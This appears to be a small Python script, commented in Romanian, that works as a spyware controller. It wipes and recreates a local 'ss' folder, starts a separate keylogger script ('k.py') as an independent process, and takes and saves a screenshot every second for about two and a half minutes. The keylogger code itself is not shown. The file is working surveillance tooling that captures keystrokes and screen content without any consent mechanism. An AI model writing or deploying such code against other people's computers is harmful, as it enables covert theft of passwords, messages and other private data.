import shutil
import pyautogui
import os
import time
import subprocess


ss_contor = 1
def takeSS():
    global screenshoots_path, ss_contor

    #Extensia fisierului salvat se poate modificat dupa nevoie
    ss_name = "ss" + str(ss_contor) + ".jpeg"
    ss_contor += 1

    #Executia si salvarea efective
    temp_ss = pyautogui.screenshot()
    temp_ss.save(screenshoots_path + ss_name)


#Configurabile
ss_time_rate = 1
time_alive = 150

#Selectarea folderului in care salvam resursele
directory_path = os.getcwd() + "\\ss"

#Crearea / Recrearea folderului
if os.path.exists(directory_path):
    shutil.rmtree(directory_path)
os.mkdir(directory_path)

#Crearea / Recrearea fisierului pentru logare
f = open(directory_path + "\\log.txt", 'w')
f.close()

#Lansarea procesului keylogger
kProcess = subprocess.Popen(['python', 'k.py'], shell = True ) 
# use shell to have an independent process

#Accesam folderul creat si incepem executia
screenshoots_path = directory_path + "\\"
while ss_contor < time_alive :
    takeSS()
    time.sleep(ss_time_rate)

